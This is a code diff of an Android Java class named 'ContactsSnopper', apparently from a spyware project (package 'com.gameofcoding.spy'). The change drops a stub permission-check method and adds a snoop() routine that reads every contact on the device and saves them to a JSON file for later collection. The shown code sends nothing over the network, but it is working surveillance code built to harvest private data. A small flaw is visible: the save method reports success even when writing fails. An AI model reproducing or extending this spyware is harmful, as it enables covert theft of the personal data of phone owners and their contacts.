@@ -4,30 +4,28 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.ContactsContract;
-import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+import com.gameofcoding.spy.utils.XLog;
+import java.io.File;
 
-public class ContactsSnopper extends Spy {
+public class ContactsSnopper implements Spy {
+    private final String TAG = "ContactsSnopper";
     public static final String CONTACTS_FILE_NAME = "contacts.json";
     private Context mContext;
+    private File mDestFile;
     private final JSONArray contacts = new JSONArray();
 
-    public ContactsSnopper(Context context) {
+    public ContactsSnopper(Context context, File destFile) {
 	mContext = context;
+	mDestFile = destFile;
     }
 
     @Override
-    public boolean hasPermissions() {
-	// TODO: Check contacts permission
-	return false;
-    }
-
-    @Override
-    public ContactsSnopper load() {
+    public void snoop() {
 	ContentResolver contentResolver = mContext.getContentResolver();
 	Cursor contCursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
 						  null, null, null, null);
@@ -69,16 +67,24 @@ public class ContactsSnopper extends Spy {
 	}
 	if(contCursor != null)
 	    contCursor.close();
-	return this;
+	
+	// Save contacts
+	saveContacts(mDestFile);
     }
 
-    @Override
-    public boolean save(File file) throws IOException {
-	File contactsFile = new File(file, CONTACTS_FILE_NAME);
-	FileWriter fw = new FileWriter(contactsFile);
-	fw.write(contacts.toString());
-	fw.flush();
-	fw.close();
-	return false;
+    public boolean saveContacts(File contactsFile) {
+	if(contactsFile.isDirectory()) {
+	    XLog.w(TAG, "saveContacts(File): contacts file '" + contactsFile + "' is a directory");
+	    return false;
+	}
+	try {
+	    FileWriter fw = new FileWriter(contactsFile);
+	    fw.write(contacts.toString());
+	    fw.flush();
+	    fw.close();
+	} catch(IOException e) {
+	    XLog.e(TAG, "saveContacts(File): Error occurred while saving contacts.", e);
+	}
+	return true;
     }
 }
